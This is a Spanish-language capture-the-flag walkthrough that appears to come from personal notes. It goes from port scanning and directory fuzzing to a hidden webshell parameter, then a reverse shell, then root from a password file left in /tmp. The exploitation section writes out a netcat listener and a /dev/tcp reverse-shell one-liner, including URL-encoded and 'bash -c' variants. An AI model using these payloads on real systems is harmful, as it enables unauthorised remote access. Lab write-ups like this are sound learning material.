## Reconocimiento
---
La página nos da la siguiente información:

Realizamos un [[nmap]] básico de reconocimiento de todos los puertos abiertos de la máquina
![[Pasted image 20240710003455.png]]

Ahora realizamos un [[nmap]] para conocer la versión y cualquier script que tiene el puerto 80 abierto que tiene la [[IP]].
![[Pasted image 20240710003517.png]]


Vemos que no hay nada extraño dentro del puerto y lo que se procede a realizar es una inspección de la web.

No nos muestra nada valioso, procedemos a buscar directorios con [[gobuster]].
![[Pasted image 20240710003547.png]]

Verificamos dos archivos importantes "shell.php" y "warning.html". Primero revisaremos warning.html para después verificar la otra respectivamente.

La web nos muestra el siguiente label que nos dice que existe un parámetro que es específico que se ha utilizado para el desarrollo de la webshell (/shell.php).
![[Pasted image 20240710003614.png]]

Con la afirmación anterior estamos asumiendo que se está utilizando la siguiente estructura para la [[webshell]].
![[Pasted image 20240710003648.png]]

Como podemos ver esta pide un parámetro en el comando y es el que no recuerda entonces lo que procederemos a realizar es un fuzzing a la web con [[ffuf]].

Cuando corremos el fuzzing al inicio vemos que todos los estados de todas las peticiones son de error 500 (lo cual **indica que el servidor ha encontrado una condición inesperada que le impidió cumplir con la solicitud**) entonces en el comando [[ffuf]] agregaremos el parámetro -fc 500 para filtrar los estados mencionados.
![[Pasted image 20240710003721.png]]

Ahora que ya contamos con el parámetro necesitamos obtener una reverseshell entonces realizaremos lo siguiente:

## Explotación
---
Nos pondremos en escucha con `nc -lvnp 9001`

Luego, necesitamos una revershell que nos funcione. En este caso utilizaré la siguiente ```sh -i >& /dev/tcp/192.168.0.17/9001 0>&1```. Corremos y vemos que no está interpretando la revershell. La encodeamos en formato URL y nos sale lo siguiente `sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.17%2F9001%200%3E%261`. Nos sigue sin funcionar entonces probamos poniendo todo entre comillas y agregarle un `bash -c` al incio del comando. Todo unido nos daría lo siguiente `bash -c "sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.17%2F9001%200%3E%261"`. Obtenemos la [[reverse shell]]!!
![[Pasted image 20240710003818.png]]

Una vez con la shell generamos una [[shell interactiva]].

## Escalada de privilegios
---
Tuvimos una pista al inicio de la web entonces entramos a /tmp y vemos que existe un txt con la contraseña root.
![[Pasted image 20240710003846.png]]

**Y YA SOMOS ROOT 😄 **




